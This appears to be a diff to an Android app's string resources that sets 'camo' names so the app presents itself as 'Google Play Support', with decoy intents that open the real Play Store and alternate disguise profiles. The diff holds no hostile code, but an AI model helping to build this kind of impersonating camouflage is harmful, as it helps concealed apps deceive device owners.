@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <!-- PlayHelper Strings -->
-    <string name="camo_app_name">Google Play helper</string>
-    <string name="camo_title">Google Play helper</string>
+    <!-- PlaySupport Strings -->
+    <string name="camo_app_name">Google Play Support</string>
+    <string name="camo_title">Google Play Support</string>
     <!-- Decoy Intent Action: Google Play Store -->
     <string name="camo_intent_action">https://play.google.com/store/apps</string>
     <string name="camo_intent_action_active">https://play.google.com/store/apps/top</string>
@@ -48,7 +48,5 @@
         <item>Unlock premium features and exclusive content today.</item>
     </string-array>
 
-    <!-- Unused strings to satisfy Manager.kt compilation for WeatherApp/CarrierServices profiles -->
-    <string name="camo_title_idle">Google Play helper</string>
-    <string name="camo_state_idle">Unused</string>
+
 </resources>
